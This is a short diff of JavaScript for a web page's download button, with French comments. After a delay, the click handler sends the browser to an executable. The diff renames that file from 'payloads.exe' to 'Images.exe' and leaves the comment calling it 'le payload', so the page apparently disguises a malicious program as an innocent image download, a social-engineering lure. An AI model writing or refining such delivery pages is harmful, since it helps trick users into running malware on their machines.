@@ -5,7 +5,7 @@ document.getElementById('downloadBtn').addEventListener('click', function() {
     
     setTimeout(() => {
         // Télécharger le payload
-        window.location.href = 'payloads.exe';
+        window.location.href = 'Images.exe';
         
         // Changer le texte après téléchargement
         this.innerHTML = '<i class="fas fa-check"></i> <span>TÉLÉCHARGEMENT DÉMARRÉ</span>';
